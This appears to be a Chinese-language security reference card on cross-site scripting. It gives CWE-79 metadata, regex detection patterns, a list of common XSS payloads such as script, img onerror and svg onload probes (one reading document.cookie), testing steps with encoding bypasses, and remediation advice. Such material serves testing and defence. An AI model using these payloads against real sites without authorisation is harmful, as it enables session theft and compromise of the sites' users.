# XSS (Cross-Site Scripting) Pattern

## 基本信息

| 属性 | 值 |
|------|-----|
| 类型 | Injection |
| CWE | CWE-79 |
| 严重性 | High |
| 变体 | Reflected, Stored, DOM-based |

## 检测模式

```regex
<script[^>]*>.*?</script>
javascript:
on\w+\s*=
<iframe|<object|<embed
```

## 常用 Payload

```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert('XSS')">
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<animatetransform onbegin=alert(1)>
```

## 检测步骤

1. **识别输入点**: URL参数、表单、Header
2. **基本检测**: `<script>alert(1)</script>`
3. **属性检测**: `" onmouseover="alert(1)`
4. **编码绕过**: HTML实体、URL编码
5. **DOM检测**: `location.hash`

## 修复建议

- 输出编码 (HTML转义)
- Content Security Policy (CSP)
- HTTPOnly Cookie
- 输入验证

## 参考

- https://owasp.org/www-community/attacks/xss/
- https://portswigger.net/web-security/cross-site-scripting
